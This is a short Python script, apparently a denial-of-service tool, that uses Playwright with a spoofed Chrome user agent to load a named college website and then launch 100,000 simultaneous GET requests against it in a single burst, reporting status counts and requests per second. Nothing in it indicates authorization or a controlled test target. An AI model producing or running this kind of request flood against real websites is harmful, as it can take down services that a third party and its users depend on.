import asyncio
import time
from playwright.async_api import async_playwright

URL = "https://www.lathamathavan.edu.in/"

BATCH_SIZE = 100000


async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)

        context = await browser.new_context(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/151.0.0.0 Safari/537.36"
            )
        )

        page = await context.new_page()

        # Warm up / establish cookies if required
        await page.goto("https://www.lathamathavan.edu.in/")

        print(f"Sending {BATCH_SIZE} requests as one burst...")

        start = time.perf_counter()

        async def request(i):
            try:
                response = await page.request.get(URL)
                return i, response.status
            except Exception as e:
                return i, str(e)

        # Launch the entire batch together
        results = await asyncio.gather(
            *(request(i) for i in range(BATCH_SIZE))
        )

        elapsed = time.perf_counter() - start

        counts = {}

        for _, status in results:
            counts[status] = counts.get(status, 0) + 1

        print("\n========== RESULT ==========")
        print(f"Requests : {BATCH_SIZE}")
        print(f"Time     : {elapsed:.3f}s")
        print(f"RPS      : {BATCH_SIZE / elapsed:.2f}")

        for status, count in sorted(counts.items(), key=lambda x: str(x[0])):
            print(f"{status}: {count}")

        await browser.close()


asyncio.run(main())